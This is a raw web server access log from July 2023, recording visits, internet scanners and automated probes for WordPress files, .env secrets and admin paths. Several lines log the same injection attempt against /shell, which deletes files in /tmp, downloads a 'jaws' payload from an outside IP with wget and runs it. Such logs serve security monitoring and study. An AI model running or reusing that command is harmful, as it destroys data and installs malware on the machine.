143.110.222.166 - - [21/Jul/2023:21:00:06 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.141.34 - - [21/Jul/2023:21:11:57 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
199.254.199.239 - - [21/Jul/2023:21:23:16 +0000] "CONNECT tls.mrrage.xyz:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
199.254.199.239 - - [21/Jul/2023:21:23:16 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" "-"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET / HTTP/1.1" 200 5430 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET / HTTP/1.1" 200 5429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET / HTTP/1.1" 200 5429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:38 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:39 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
20.213.153.156 - - [21/Jul/2023:21:36:40 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
54.37.79.75 - - [21/Jul/2023:21:41:38 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [21/Jul/2023:21:41:38 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.11.4 - - [21/Jul/2023:21:50:08 +0000] "\x16\x03\x01" 400 488 "-" "-"
172.187.130.172 - - [21/Jul/2023:22:10:53 +0000] "GET / HTTP/1.1" 200 2052 "-" "python-requests/2.31.0"
172.187.130.172 - - [21/Jul/2023:22:10:54 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.187.130.172 - - [21/Jul/2023:22:10:55 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [21/Jul/2023:22:12:54 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
137.184.201.55 - - [21/Jul/2023:22:13:35 +0000] "\x16\x03\x01" 400 488 "-" "-"
137.184.201.55 - - [21/Jul/2023:22:13:36 +0000] "\x16\x03\x01" 400 488 "-" "-"
137.184.201.55 - - [21/Jul/2023:22:13:36 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
137.184.201.55 - - [21/Jul/2023:22:13:36 +0000] "GET /client/get_targets HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
137.184.201.55 - - [21/Jul/2023:22:13:36 +0000] "GET /upl.php HTTP/1.1" 404 437 "-" "Mozilla/5.0"
137.184.201.55 - - [21/Jul/2023:22:13:36 +0000] "\x16\x03\x01" 400 488 "-" "-"
138.197.204.67 - - [21/Jul/2023:22:16:23 +0000] "GET / HTTP/1.0" 200 5393 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
197.62.35.90 - - [21/Jul/2023:22:24:47 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.8.251.176/jaws;sh+/tmp/jaws" 400 488 "-" "-"
54.37.79.75 - - [21/Jul/2023:22:31:58 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [21/Jul/2023:22:31:58 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.247 - - [21/Jul/2023:22:51:56 +0000] "GET / HTTP/1.0" 200 5393 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
3.238.113.137 - - [21/Jul/2023:22:55:32 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3876.0 Safari/537.36"
3.238.113.137 - - [21/Jul/2023:22:55:54 +0000] "GET //code.jquery.com/jquery-1.12.4.min.js HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.5 Mobile Safari/537.36"
3.238.113.137 - - [21/Jul/2023:22:55:54 +0000] "GET //stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js HTTP/1.1" 404 456 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200"
3.238.113.137 - - [21/Jul/2023:22:55:54 +0000] "GET //oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.35 Safari/537.36"
3.238.113.137 - - [21/Jul/2023:22:55:54 +0000] "GET //oss.maxcdn.com/respond/1.4.2/respond.min.js HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0"
74.201.28.62 - - [21/Jul/2023:23:06:00 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
74.201.28.62 - - [21/Jul/2023:23:06:00 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [21/Jul/2023:23:07:37 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
162.216.149.59 - - [21/Jul/2023:23:36:35 +0000] "GET / HTTP/1.1" 200 5374 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
54.37.79.75 - - [21/Jul/2023:23:39:59 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [21/Jul/2023:23:40:00 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.156.72.32 - - [21/Jul/2023:23:44:48 +0000] "\x03" 400 488 "-" "-"
45.79.181.223 - - [21/Jul/2023:23:46:00 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [22/Jul/2023:00:18:12 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
85.174.196.106 - - [22/Jul/2023:00:37:31 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:00:39:31 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:00:39:31 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.203.57.7 - - [22/Jul/2023:00:55:03 +0000] "GET / HTTP/1.1" 200 5393 "-" "HTTP Banner Detection (https://security.ipip.net)"
143.110.222.166 - - [22/Jul/2023:01:09:21 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
107.170.247.44 - - [22/Jul/2023:01:17:41 +0000] "GET /hudson HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
185.180.143.48 - - [22/Jul/2023:01:29:48 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.170.230.33 - - [22/Jul/2023:01:40:52 +0000] "GET /druid/index.html HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [22/Jul/2023:01:50:43 +0000] "\x16\x03\x01" 400 488 "-" "-"
156.193.219.0 - - [22/Jul/2023:01:56:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.8.251.176/jaws;sh+/tmp/jaws" 400 488 "-" "-"
156.193.219.0 - - [22/Jul/2023:01:56:11 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.8.251.176/jaws;sh+/tmp/jaws" 400 488 "-" "-"
207.154.220.22 - - [22/Jul/2023:01:56:58 +0000] "\x16\x03\x01" 400 488 "-" "-"
207.154.220.22 - - [22/Jul/2023:01:56:59 +0000] "GET /geoip/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.220.22 - - [22/Jul/2023:01:56:59 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
192.241.236.53 - - [22/Jul/2023:02:10:43 +0000] "GET /ReportServer HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [22/Jul/2023:02:11:54 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.180.143.136 - - [22/Jul/2023:02:17:05 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.222.48 - - [22/Jul/2023:02:22:29 +0000] "GET /portal/redlion HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
198.199.97.153 - - [22/Jul/2023:02:24:02 +0000] "GET /actuator/health HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
54.37.79.75 - - [22/Jul/2023:02:24:38 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:02:24:39 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:03:04:10 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:03:04:10 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
36.225.129.2 - - [22/Jul/2023:03:09:36 +0000] "j!\xab\x85\x9e\xd4|fGu\xcd'\x94\xdf\x1e\xd2\xd9\v\\\x18\x89H\xae\xe9\xf6D\xcd\xd7\r\x01\xaf2]U\xea\xf0D\n" 400 488 "-" "-"
143.110.222.166 - - [22/Jul/2023:03:17:45 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.165.16.72 - - [22/Jul/2023:03:41:44 +0000] "\x03" 400 488 "-" "-"
141.98.6.120 - - [22/Jul/2023:03:52:02 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.79.181.94 - - [22/Jul/2023:03:53:45 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [22/Jul/2023:04:16:58 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.37.79.75 - - [22/Jul/2023:04:19:21 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [22/Jul/2023:04:19:21 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.139.67 - - [22/Jul/2023:04:27:50 +0000] "\x16\x03\x01" 400 488 "-" "-"
190.145.240.16 - - [22/Jul/2023:04:43:49 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.16 - - [22/Jul/2023:04:43:50 +0000] "GET /css/loading.css HTTP/1.1" 200 493 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.16 - - [22/Jul/2023:04:43:50 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
74.82.47.4 - - [22/Jul/2023:04:45:05 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
190.145.240.155 - - [24/Jul/2023:15:34:45 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:34:45 +0000] "GET /css/loading.css HTTP/1.1" 200 493 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:35:27 +0000] "POST /index.php HTTP/1.1" 200 1984 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:35:31 +0000] "POST /index.php HTTP/1.1" 200 1983 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:35:49 +0000] "POST /index.php HTTP/1.1" 200 18684 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:35:56 +0000] "GET /css/Spinner.gif HTTP/1.1" 200 79300 "http://159.223.194.74/css/loading.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:35:56 +0000] "POST /generarXml.php HTTP/1.1" 500 185 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:37:30 +0000] "POST /index.php HTTP/1.1" 200 18684 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:37:31 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:37:40 +0000] "POST /index.php HTTP/1.1" 200 18684 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:37:43 +0000] "POST /generarXml.php HTTP/1.1" 500 185 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:38:32 +0000] "-" 408 0 "-" "-"
41.47.5.98 - - [24/Jul/2023:15:39:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.8.251.176/jaws;sh+/tmp/jaws" 400 488 "-" "-"
190.145.240.155 - - [24/Jul/2023:15:40:02 +0000] "POST /index.php HTTP/1.1" 200 18684 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:40:02 +0000] "GET /css/loading.css HTTP/1.1" 200 494 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:40:03 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
167.94.138.49 - - [24/Jul/2023:15:40:12 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.49 - - [24/Jul/2023:15:40:12 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
167.94.138.49 - - [24/Jul/2023:15:40:12 +0000] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
190.145.240.155 - - [24/Jul/2023:15:40:07 +0000] "POST /generarXml.php HTTP/1.1" 500 185 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:41:46 +0000] "POST /index.php HTTP/1.1" 200 18684 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:41:47 +0000] "GET /css/loading.css HTTP/1.1" 200 494 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:41:47 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.155 - - [24/Jul/2023:15:41:49 +0000] "POST /generarXml.php HTTP/1.1" 500 185 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
152.32.148.110 - - [24/Jul/2023:15:45:05 +0000] "\x16\x03\x01\x01\t\x01" 400 488 "-" "-"
152.32.148.110 - - [24/Jul/2023:15:45:19 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
152.32.148.110 - - [24/Jul/2023:15:45:29 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.148.110 - - [24/Jul/2023:15:45:31 +0000] "GET /robots.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.148.110 - - [24/Jul/2023:15:45:35 +0000] "GET /sitemap.xml HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
45.33.80.243 - - [24/Jul/2023:15:49:48 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [24/Jul/2023:15:58:22 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.190.250.159 - - [24/Jul/2023:16:09:08 +0000] "\x16\x03\x01" 400 488 "-" "-"
146.190.250.159 - - [24/Jul/2023:16:09:08 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.190.250.159 - - [24/Jul/2023:16:09:08 +0000] "GET /1.php HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
